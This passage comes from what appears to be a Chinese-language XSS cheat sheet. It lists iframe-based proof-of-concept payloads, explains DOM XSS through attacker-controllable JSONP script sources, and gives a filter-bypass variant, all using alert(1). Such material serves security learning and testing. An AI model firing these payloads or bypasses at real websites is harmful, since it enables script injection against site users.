<div class="highlight highlight-html"><pre><span class="nt">&lt;iframe</span> <span class="na">onload=</span><span class="s">"alert(1)"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</pre></div>

<ul>
<li>src执行js</li>
</ul>

<div class="highlight highlight-html"><pre><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"javascript:alert(1)"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</pre></div>

<ul>
<li>chrome下data协议执行代码</li>
</ul>

<div class="highlight highlight-html"><pre><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</pre></div>

<ul>
<li>chrome下srcdoc属性，变体</li>
</ul>

<div class="highlight highlight-html"><pre><span class="nt">&lt;iframe</span> <span class="na">srcdoc=</span><span class="s">"&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</pre></div>
</li>
<li>
<p>DOM XSS 路径</p>

<p>一些程序员会动态的加载json数据，同域的时候，可以使用ajax；而有时候，数据所在域和当前页面所在域又不一致。所以需要跨域请求。跨域请求数据的手段中，有一种叫做jsonp。</p>

<p>用代码表示的话，就是
<code>somescript.src="http://otherdomain.com/xx?jsonp=callback"</code></p>

<p>某些时候，程序员会在调用外部数据的时候带上可控的参数。</p>

<p><code>somescript.src="http://otherdomain.com/xx?jsonp=callback&amp;id="+id;</code></p>

<p>如果这个id我们可控，将可能带来XSS问题</p>

<ol>
<li>
<code>script src="完全可控"</code> ,这种就简单了，直接将地址换为我们的JS地址</li>
<li><code>script src="/path/xxx/[路径可控]/1.js"</code></li>
</ol>
</li>
<li>
<p>XSS 过滤器绕过</p>

<p><code>&lt;img src=1 onerror=alert(1)&gt;</code> 被和谐为 <code>&lt;img src=1 onerror&gt;</code>
改为 <code>&lt;script src=data:,alert(1)&lt;!--</code></p>
</li>
<li>
<p>存储型 XSS</p>

<p>可以套现的各种XSS技巧，HTML标签
<a href="http://html5sec.org/">HTML5 Security Cheatsheet</a></p>
</li>
</ul>
</article></body></html>